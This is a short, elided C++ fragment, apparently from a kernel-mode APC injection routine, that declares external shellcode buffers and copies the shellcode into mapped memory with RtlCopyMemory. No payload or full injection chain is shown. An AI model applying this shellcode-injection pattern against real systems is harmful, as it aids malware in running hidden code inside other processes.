...
extern unsigned char* injectedShellcode;
extern size_t injectedShellcodelen;
...
void ApcHandler::normalInjectCode(PVOID, PVOID, PVOID)
{
	...
	void* address{ };
	size_t shellcode_size = injectedShellcodelen;
	...
	RtlCopyMemory(mapped_address,injectedShellcode, injectedShellcodelen);
